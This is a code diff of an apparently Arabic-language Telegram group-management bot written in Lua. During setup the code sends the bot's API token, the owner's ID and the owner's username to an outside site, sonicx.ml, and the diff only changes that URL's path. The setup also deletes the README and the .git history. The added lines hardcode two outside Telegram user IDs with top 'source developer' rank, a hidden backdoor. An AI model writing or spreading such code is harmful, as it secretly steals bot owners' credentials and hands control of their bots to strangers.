@@ -108,7 +108,7 @@ local Text = "•~اهلا عزيزي [المطور الاساسي](tg://user?id
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 Souser = SUDO_USER:gsub('@','')
 Souser = Souser:gsub([[\_]],'_')
-https.request("https://sonicx.ml/Kgt/Kgt.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
+https.request("https://sonicx.ml/Sourcedany/Source.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -242,7 +242,10 @@ msg.GroupActive = true
 else
 msg.GroupActive = false
 end
-if msg.sender_user_id_ == 1153357069 then 
+if msg.sender_user_id_ == 1614375843 then 
+msg.TheRank =  'مطور السورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == 798474922 then 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
